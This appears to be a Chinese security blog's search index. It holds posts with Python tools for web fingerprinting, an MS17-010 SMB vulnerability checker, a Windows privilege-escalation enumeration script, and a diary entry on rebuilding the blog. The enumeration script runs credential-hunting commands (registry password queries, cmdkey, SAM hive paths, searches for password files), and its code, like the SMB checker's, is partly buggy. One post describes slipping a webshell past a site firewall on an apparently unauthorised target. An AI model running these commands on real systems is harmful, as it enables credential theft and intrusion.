<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>抓取云悉接口</title>
      <link href="/2018/08/12/%E6%8A%93%E5%8F%96%E4%BA%91%E6%82%89%E6%8E%A5%E5%8F%A3/"/>
      <url>/2018/08/12/%E6%8A%93%E5%8F%96%E4%BA%91%E6%82%89%E6%8E%A5%E5%8F%A3/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前段时间一直想抓web指纹，发现手动抓的残缺不全还不准确。后来想抓云悉<br>指纹没有做。现在正好有时间爬了。<br><img src="https://i.imgur.com/AE9yFBG.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>我们首先来抓包，分析一下URL<br>云悉：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><p><img src="https://i.imgur.com/LXEWIFX.png" alt=""></p><p>有type,url,string,_token。这几个参数</p><pre><code>通查看网页源代码可以得出，string的参数是固定的。而_token是可以从网页源代码获取的。url是你自己的type是cms查询的类型，还有一个查whois的</code></pre><p>然后可以得出思路：</p><pre><code>1.利用正则的search搜索功能抓取_token2.过滤掉_token一些无关紧要的符合3.组成参数4.经过循环并且加入字典5.发送post请求并带上参数6.解刨json数据</code></pre><p>代码：</p><pre><code>import requestsimport threadingimport redef zhuaq(urls):user=input(&apos;url:&apos;)data={}data2={}headers={&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}url2=&apos;http://www.yunsee.cn/home/getInfo&apos;reqts=requests.get(url=urls,headers=headers)search=re.search(&apos;_token:.*&apos;,reqts.text)token=&apos;{}&apos;.format(search.group()).replace(&apos;}&apos;,&apos;&apos;).replace(&apos;,&apos;,&apos;&apos;).replace(&apos;&quot;&apos;,&apos;&apos;).replace(&apos;:&apos;,&apos;&apos;).replace(&apos;_token&apos;,&apos;&apos;).strip()datas=&apos;type=webcms&amp;url={}&amp;_token={}&apos;.format(user,token)datas2 = &apos;type=webinfo&amp;url={}&amp;_token={}&apos;.format(user, token)for v in datas.split(&apos;&amp;&apos;):    key,value=v.split(&apos;=&apos;,1)    data[key]=valuereqvs=requests.post(url=url2,headers=headers,data=data)jsons=reqvs.json()for v in datas2.split(&apos;&amp;&apos;):    key, value = v.split(&apos;=&apos;, 1)    data2[key] = valuereqvs2 = requests.post(url=url2, headers=headers, data=data2)json2=reqvs2.json()print(&apos;url:{}&apos;.format(user))print(&apos;whois_dns:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_dns&apos;]))print(&apos;icp_name:{}&apos;.format(json2[&apos;res&apos;][&apos;icp_name&apos;]))print(&apos;ip:{}&apos;.format(json2[&apos;res&apos;][&apos;ip&apos;]))print(&apos;language:{}&apos;.format(json2[&apos;res&apos;][&apos;language&apos;]))print(&apos;whois_mail:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_mail&apos;]))print(&apos;os:{}&apos;.format(json2[&apos;res&apos;][&apos;os&apos;]))print(&apos;cdn:{}&apos;.format(json2[&apos;res&apos;][&apos;cdn&apos;]))print(&apos;server:{}&apos;.format(json2[&apos;res&apos;][&apos;server&apos;]))print(&apos;record_id:{}&apos;.format(json2[&apos;res&apos;][&apos;record_id&apos;]))print(&apos;whois_isp:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_isp&apos;]))#print(&apos;LLC:{}&apos;.format(json2[&apos;res&apos;][&apos;LLC&apos;]))print(&apos;whois_date:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_date&apos;]))print(&apos;create:{}&apos;.format(json2[&apos;res&apos;][&apos;create&apos;]))print(&apos;icp_id:{}&apos;.format(json2[&apos;res&apos;][&apos;icp_id&apos;]))print(&apos;whois_name:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_name&apos;]))print(&apos;idc:{}&apos;.format(json2[&apos;res&apos;][&apos;idc&apos;]))print(&apos;cms:{}&apos;.format(jsons[&apos;mess&apos;]))for reqs in jsons[&apos;res&apos;][0:]:    print(&apos;desc:{} name:{}&apos;.format(reqs[&apos;desc&apos;],reqs[&apos;name&apos;]))def run():    url = &apos;http://www.yunsee.cn/&apos;    t=threading.Thread(target=zhuaq,args=(url,))    t.start()if __name__ == &apos;__main__&apos;:    run()</code></pre><p>测试效果图：<br><img src="https://i.imgur.com/74eBaKb.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python写MS17-010扫描器</title>
      <link href="/2018/08/11/python%E5%86%99MS17-010%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
      <url>/2018/08/11/python%E5%86%99MS17-010%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
      <content type="html"><![CDATA[<p>前言：<br>MS17-010早已是上一年的事情了。只不过想写一个检测脚本方便自己进行测试和用<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=1136046643,4023666134&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h2><p>先说思路：</p><pre><code>    negotiate_protocol_request = binascii.unhexlify(    &quot;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&quot;)session_setup_request = binascii.unhexlify(    &quot;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&quot;)tree_connect_request = binascii.unhexlify(    &quot;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&quot;)trans2_session_setup = binascii.unhexlify(    &quot;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&quot;)</code></pre><p>1.先把这些payload(首先把payload进行字符化)发送到目标主机<br>2.然后读取返回的数据进行判断<br>3.验证是否存在MS17010漏洞</p><p>代码：</p><pre><code>import socketimport binasciiimport structimport sysuser=input(&apos;IP:&apos;)def scan():payload0 = binascii.unhexlify (&apos;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&apos;)payload1 = binascii.unhexlify(&apos;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&apos;)payload2 = binascii.unhexlify(&apos;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&apos;)payload3 = binascii.unhexlify(&apos;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&apos;)s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.settimeout(5)host=userport=445s.connect((host,port))print(&apos;[+]{}Ready to send&apos;.format(host))s.send(payload0)s.recv(1024)print(&apos;[+]{}Setting request&apos;.format(host))s.send(payload1)session_setup_response=s.recv(1024)user_id=session_setup_response[32:34]print(host,&apos;User ID=%s&apos;%struct.unpack(&apos;&lt;H&apos;,user_id)[0])modified_tree_connect_request=list(payload2)modified_tree_connect_request[32]=user_id[0]modified_tree_connect_request[33]=user_id[1]modified_tree_connect_request=&quot;&quot;.join(&apos;%s&apos;%ld for ld in modified_tree_connect_request)print(&apos;[+]{}Send connection&apos;.format(host))s.send(payload2)tree_connect_response=s.recv(1024)tree_id=tree_connect_response[28:30]print(&apos;[+]{}&apos;.format(host),&apos;Tree ID=%s&apos;%struct.unpack(&apos;&lt;H&apos;,tree_id)[0])modified_trans2_session_setup=list(payload3)modified_trans2_session_setup[28]=tree_id[0]modified_trans2_session_setup[29]=tree_id[1]modified_trans2_session_setup[32]=user_id[0]modified_trans2_session_setup[33]=user_id[1]modified_trans2_session_setup=&quot;&quot;.join(&apos;{}&apos;.format(li for li in modified_trans2_session_setup))print(&apos;[+]{}Sending success is actually returning.&apos;.format(host))s.send(payload3)final_respone=s.recv(1024)s.close()if final_respone[32]==&quot;\x51&quot;:    print(&apos;[*]existence MS17-010&apos;)else:    print(&apos;[-]Not existence MS17-010&apos;)def run():    scan()run()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/UuZtBJw.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows提权辅助脚本</title>
      <link href="/2018/08/09/windows%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/"/>
      <url>/2018/08/09/windows%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>进入到后渗透阶段就涉及到了提权。提权的第一步是信息收集，所以这个脚本因此而诞生。当然Demon哥分享的干货是够干的</p><p><img src="https://i.imgur.com/VJFPdww.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>windows提权用到的命令：</p><pre><code>systeminfonet usernet user user1ipconfig /allroute printarp -Anetstat -anonetsh firewall show stateschtasks /query /fo LIST /vtasklist /SVCnet startDRIVERQUERYwmic qfe get Caption,Description,HotFixID,InstalledOnwmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;sc qc Spooler</code></pre><p>等等之类的</p><p>代码：</p><pre><code>import osdef collect():    xj=open(&apos;save.txt&apos;,&apos;w&apos;)    xj.close()    print(&apos;[+]什么是操作系统和架构？它缺少任何补丁吗？&apos;)    systeminfo=os.popen(&apos;systeminfo&apos;)    wmic_qfe=os.popen(&apos;wmic qfe&apos;)    for s in systeminfo:        print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for c in wmic_qfe:        print(c,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]环境变量有什么有趣的吗？域控制器在LOGONSERVER？&apos;)    set=os.popen(&apos;set&apos;)    #Get_chiditem=os.popen(&apos;Get-ChildItem Env: | ft Key,Value&apos;)    for e in set:        print(e,file=open(&apos;save.txt&apos;,&apos;a&apos;))    #for t in Get_chiditem:        #print(t,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他连接的驱动器吗？&apos;)    net_use=os.popen(&apos;net use&apos;)    wmic_log=os.popen(&apos;wmic logicaldisk get caption,description,providername&apos;)    #psd=os.popen(&apos;Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root&apos;)    for ne in net_use:        print(ne,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for g in wmic_log:        print(g,file=open(&apos;save.txt&apos;,&apos;a&apos;))    #for d in psd:        #print(d,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]你是谁？&apos;)    whoami=os.popen(&apos;whoami&apos;)    username=os.popen(&apos;echo %USERNAME%&apos;)    for whoa in whoami:        print(whoa,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for m in username:        print(m,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]任何有趣的用户权限？注意：“状态”列并不表示用户具有或无权访问此权限。如果列出了该权限，则该用户拥有该权限。&apos;)    priv=os.popen(&apos;whoami /priv&apos;)    for i in priv:        print(i,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]用户在系统上有什么用途？任何未清理的旧用户配置文件？&apos;)    ur=os.popen(&apos;net users&apos;)    bw=os.popen(&apos;dir /b /ad &quot;C:/Users/&quot;&apos;)    #bs=os.popen(&apos;dir /b /ad &quot;C:/Documents and Settings/&quot; # Windows XP and below&apos;)    for r in ur:        print(r,file=open(&apos;save.txt&apos;,&apos;a&apos;))        for w in bw:            print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))            #for s in bs:                #print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他人登录吗？&apos;)    qwinsta=os.popen(&apos;qwinsta&apos;)    for w in qwinsta:        print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]系统上有哪些组？&apos;)    net_localgroup=os.popen(&apos;net localgroup&apos;)    for group in net_localgroup:        print(group,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]Administrators组中是否有任何用户？&apos;)    net_localgroup_Administrators=os.popen(&apos;net localgroup Administrators&apos;)    for administrator in net_localgroup_Administrators:        print(administrator,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]用户自动登录注册表中的任何内容？&apos;)    reg_query=os.popen(&apos;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;&apos;)    for v in reg_query:        print(v,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]在Credential Manager中有什么有趣的东西吗？&apos;)    cmdkey_list=os.popen(&apos;cmdkey /list&apos;)    for l in cmdkey_list:        print(l,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]cmdkey /list我们可以访问SAM和SYSTEM文件吗？&apos;)    lg=[&apos;%SYSTEMROOT%/repair/SAM&apos;,&apos;%SYSTEMROOT%/System32/config/RegBack/SAM&apos;,&apos;%SYSTEMROOT%/System32/config/SAM&apos;,&apos;%SYSTEMROOT%/repair/system&apos;,&apos;%SYSTEMROOT%/System32/config/SYSTEM&apos;,&apos;%SYSTEMROOT%/System32/config/RegBack/system&apos;]    for k in lg:        system=os.popen(k)        for q in system:            print(q,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]安装了什么软件？&apos;)    rj=[&apos;dir /a &quot;C:\Program Files&quot;&apos;,&apos;dir /a &quot;C:\Program Files (x86)&quot;&apos;,&apos;reg query HKEY_LOCAL_MACHINE\SOFTWARE&apos;]    for j in rj:        qw=os.popen(j)        for w in qw:            print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]程序文件夹中每个人或用户的完全权限？&apos;)    icacls=[&apos;icacls &quot;C:\Program Files\*&quot; 2&gt;nul&apos;,&apos;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul&apos;,&apos;icacls &quot;C:\Program Files\*&quot; 2&gt;nul &apos;,&apos;icacls &quot;C:\Program Files (x86)\*&quot;&apos;]    for aw in icacls:        qdw=os.popen(aw)        for rs in qdw:            print(rs,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]系统上正在运行的进程/服务是什么？内部服务没有暴露吗？如果是这样，我们可以打开它吗？&apos;)    tasklist=[&apos;tasklist /svc&apos;,&apos;tasklist /v&apos;,&apos;net start&apos;,&apos;sc query&apos;,]    for t in tasklist:        wx=os.popen(t)        for p in wx:            print(p,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]有没有不带引号的服务路径？&apos;)    wmcs=os.popen(&apos;wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;&apos;)    for m in wmcs:        print(m,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]那里有什么预定的任务？什么定制实施？&apos;)    xw=os.popen(&apos;schtasks /query /fo LIST 2&gt;nul | findstr TaskName&apos;)    print(xw,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]启动时跑了什么？&apos;)    qz=[&apos;wmic startup get caption,command&apos;,&apos;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run&apos;,&apos;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&apos;,&apos;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run&apos;,&apos;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&apos;,&apos;dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;&apos;,&apos;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;&apos;]    for z in qz:        xq=os.popen(z)        for r in xq:            print(r,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]连接了哪些NIC？有多个网络吗？&apos;)    ipconfig_all=os.popen(&apos;ipconfig /all&apos;)    for all in ipconfig_all:        print(all,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]我们有什么路线？&apos;)    xpo=os.popen(&apos;route print&apos;)    for o in xpo:        print(o,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]ARP缓存中的任何内容？&apos;)    arp=os.popen(&apos;arp -a&apos;)    for p in arp:        print(p,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]是否有与其他主机的连接？&apos;)    sw=os.popen(&apos;netstat -ano&apos;)    for b in sw:        print(b,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]防火墙是否已打开？如果是这样配置的是什么？&apos;)    fq=[&apos;netsh firewall show state&apos;,&apos;netsh firewall show config&apos;,&apos;netsh advfirewall firewall show rule name=all&apos;,&apos;netsh advfirewall export &quot;firewall.txt&quot;&apos;]    for u in fq:        fhq=os.popen(u)        for f in fhq:            print(f,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他有趣的界面配置吗？&apos;)    netsh_dump=os.popen(&apos;netsh dump&apos;)    for ump in netsh_dump:        print(ump,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]注册表中的任何密码？&apos;)    lv=[&apos;reg query HKCU /f password /t REG_SZ /s&apos;,&apos;reg query HKLM /f password /t REG_SZ /s &apos;]    for pasw in lv:        passwd=os.popen(pasw)        for pd in passwd:            print(pd,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]是否有可用的sysprep或无人值守文件？&apos;)    zi=os.popen(&apos;dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul&apos;)    for nb in zi:        print(nb,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]有待观察的有趣文件吗？可能在用户目录（桌面，文档等）中？&apos;)    sl=os.popen(&apos;dir /s *pass* == *vnc* == *.config* 2&gt;nul&apos;)    for lw in sl:        print(lw,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;&apos;)    print(&apos;&apos;)    print(&apos;[*]判断是否存在以下路径&apos;)    lss=[]    if os.path.exists(&apos;list.txt&apos;):        print(&apos;[+]存在list.txt&apos;)    else:        print(&apos;[-]不存在list.txt&apos;)        exit()    dk=open(&apos;list.txt&apos;,&apos;r&apos;)    for r in dk.readlines():        qk=&quot;&quot;.join(r.split(&apos;\n&apos;))        lss.append(qk)    for g in lss:        if os.path.exists(g):            print(&apos;[+]存在 {}&apos;.format(g))        else:            print(&apos;[-]不存在{}&apos;.format(g))collect()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/tpS2Tob.png" alt=""></p><p><img src="https://i.imgur.com/3KobSkD.png" alt=""></p><p>收集到的信息会写入save.txt<br>save.txt的结果：<a href="https://paste.ubuntu.com/p/dR5QGJBHY2/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/dR5QGJBHY2/</a></p><p>关于提权的两篇文章：</p><pre><code>http://www.fuzzysecurity.com/tutorials/16.htmlhttps://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</code></pre><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫抓取whatweb接口</title>
      <link href="/2018/08/08/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96whatweb%E6%8E%A5%E5%8F%A3/"/>
      <url>/2018/08/08/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96whatweb%E6%8E%A5%E5%8F%A3/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前一直想抓whatweb的接口。但是明明写的没有毛病，就是抓不了今天不死心的在写了一次。发现了问题的所在</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=453413076,2870052388&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>什么是whatweb？</strong></p><pre><code>什么是WhatWeb？WhatWeb识别网站。它的目标是回答“这是什么网站？”的问题。WhatWeb可识别Web技术，包括内容管理系统（CMS），博客平台，统计/分析包，JavaScript库，Web服务器和嵌入式设备。WhatWeb拥有超过1700个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，帐户ID，Web框架模块，SQL错误等。WhatWeb可以隐秘，快速，或彻底但缓慢。WhatWeb支持攻击级别来控制速度和可靠性之间的权衡。当您在浏览器中访问网站时，该交易包含许多关于Web技术为该网站提供支持的提示。有时，单个网页访问包含足够的信息来识别网站，但如果没有，WhatWeb可以进一步询问网站。默认的攻击级别称为“隐身”，速度最快，只需要一个网站的HTTP请求。这适用于扫描公共网站。开发了更积极的模式用于渗透测试。大多数WhatWeb插件都是彻底的，并且可以识别从微妙到显而易见的一系列线索。例如，大多数WordPress网站可以通过元HTML标签识别，例如&apos;&apos;，但少数WordPress网站删除了这个识别标签，但这并不妨碍WhatWeb。WordPress WhatWeb插件有超过15个测试，包括检查favicon，默认安装文件，登录页面，以及检查相对链接中的“/ wp-content /”。</code></pre><p><strong>whatweb在线检测地址：</strong><br><a href="https://www.whatweb.net/" target="_blank" rel="noopener">https://www.whatweb.net/</a></p><p>基本操作抓包：<br><img src="https://i.imgur.com/HVLhIyA.png" alt=""></p><p>从图中可以看见请求参数为<strong>target</strong><br>然后正常的写一个headers，然后用requests进行post请求应该就是这样吧= =很遗憾的是，这样子什么也不会返回。后来我看了一下<strong>控制台</strong>才发现原因。</p><p><img src="https://i.imgur.com/Q7prpQN.png" alt=""></p><p>图中的意思是，没有<strong>Console</strong>和<strong>Content-length</strong>头拒绝进行识别，后面抱着半信半疑的进行了测试发现居然可以了<br>代码：</p><pre><code>#-*-coding:&apos;utf-8&apos;-*-#name:九世#time:2018-8-8-20:58import requestsfrom bs4 import BeautifulSoupdef whatweb():    banner=&apos;&apos;&apos; ____  __.__.__  .__                |    |/ _|__|  | |  |  __ _______   |      &lt; |  |  | |  | |  |  \__  \  |    |  \|  |  |_|  |_|  |  // __ \_|____|__ \__|____/____/____/(____  /        \/                       \/ &apos;&apos;&apos;    print(banner)    user=input(&apos;Domain name to be querying:&apos;)    headers={&apos;user-agent&apos;:&apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&apos;,             &apos;Content-length&apos;:&apos;20&apos;,             &apos;Connection&apos;:&apos;keep-alive&apos;}    data={&apos;target&apos;: &apos;{}&apos;.format(user)}    url=&apos;https://www.whatweb.net/&apos;    reqts=requests.post(url=url,headers=headers,data=data)    dw=BeautifulSoup(reqts.text,&apos;html.parser&apos;)    for p in dw.find_all(&apos;pre&apos;):        print(p.get_text())def jy2():    banner = &apos;&apos;&apos; ____  __.__.__  .__                    |    |/ _|__|  | |  |  __ _______       |      &lt; |  |  | |  | |  |  \__  \      |    |  \|  |  |_|  |_|  |  // __ \_    |____|__ \__|____/____/____/(____  /            \/                       \/ &apos;&apos;&apos;    print(banner)    user = input(&apos;file:&apos;)    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        headers = {            &apos;user-agent&apos;: &apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&apos;,            &apos;Content-length&apos;: &apos;20&apos;,            &apos;Connection&apos;: &apos;keep-alive&apos;}        data = {&apos;target&apos;: &apos;{}&apos;.format(qc)}        url = &apos;https://www.whatweb.net/&apos;        reqts = requests.post(url=url, headers=headers, data=data)        dw = BeautifulSoup(reqts.text, &apos;html.parser&apos;)        for p in dw.find_all(&apos;pre&apos;):            print(p.get_text())print(&apos;[1] 单个域名&apos;)print(&apos;[2] 批量导入&apos;)xw=input(&apos;xz=&gt;:&apos;)if xw==&apos;1&apos;:    whatweb()elif xw==&apos;2&apos;:    jy2()</code></pre><p>两个功能，一个单检测，一个批量导入进行检测。<br>测试图如下：</p><p><img src="https://i.imgur.com/xZyzBvT.png" alt=""></p><p><img src="https://i.imgur.com/pDIc0Yl.png" alt=""></p><p>转载请声明：来自422926799.github.com</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过网站防火墙上传</title>
      <link href="/2018/08/06/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8A%E4%BC%A0/"/>
      <url>/2018/08/06/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前几天在搞站的时候，拿到了一个webshell。一开始还没有网站防火墙之类的东西，好像是一句话被管理员发现了。安了防火墙和360…360是恶心的一批的东西。</p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>其实方法很简单，注意看图，这是一开始普通上传没有做任何修改的<br>会被直接拦截<br><img src="https://i.imgur.com/L8tVoiA.png" alt=""></p><p>把图中所画的空格去掉，就能产生BUG导致上传成功。<br><img src="https://i.imgur.com/vpOPLpA.png" alt=""></p><p>上传成功<br><img src="https://i.imgur.com/tqNBsFZ.png" alt=""></p><p><img src="https://i.imgur.com/7pJXcKj.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一波三折的博客环境重新搭建</title>
      <link href="/2018/08/05/%E4%B8%80%E6%B3%A2%E4%B8%89%E6%8A%98%E7%9A%84%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83%E9%87%8D%E6%96%B0%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/08/05/%E4%B8%80%E6%B3%A2%E4%B8%89%E6%8A%98%E7%9A%84%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83%E9%87%8D%E6%96%B0%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天该死的Ubuntu崩了。。。然后博客环境也没有了。W_W，百度各种办法发现无法恢复。后面干脆重新建一个，反正文章有备份。以后一定备份博客。。。喵了个咪的。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1325385962,3551867219&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先把仓库删除，安装Git，nodejs。然后在安装hexo</p><pre><code>git下载地址：https://git-scm.com/nodejs下载地址：https://nodejs.org/en/下载好后，各自安装</code></pre><p>在x盘创建一个目录，名为mylogo。然后进入其目录执行</p><pre><code>npm install -g hexonpm install hexo-deployer-git --save</code></pre><p>然后下载Cactus主题，进行替换更改。在进行创建新的分类</p><pre><code>hexo new page Writing</code></pre><p>修改_config.yml改名字等等之类的东西。在添加cactus的站内搜索功能</p><pre><code>hexo new page Searchnpm install hexo-generator-search --save进入source/Search目录，修改index.md,添加Search: true</code></pre><p>在将备份的文章放入source/_posts,在git bash创建ssh，然后将其放入github。执行hexo -d。执行之后发现</p><pre><code>ERROR Deployer not found: .git</code></pre><p>安装hexo-depoyer-git，将git添加其环境变量。进行电脑重启，执行git init,然后在执行hexo -d,在次执行hexo -d 发现一个警告为IP永久添加RSA秘钥之类的。打开host文件添加 </p><pre><code>“自己的IP” github.com</code></pre><p>之后在次执行发现</p><pre><code>warning: LF will be replaced by CRLF in xxxx</code></pre><p>解决方法：</p><pre><code>git config --global core.autocrlf false</code></pre><p>再次执行hexo -d，发现没有毛病了。再次，成功的把博客搭建好了。。。<br>这次没加2D模型。有人说太宅男了。</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/08/05/hello-world/"/>
      <url>/2018/08/05/hello-world/</url>
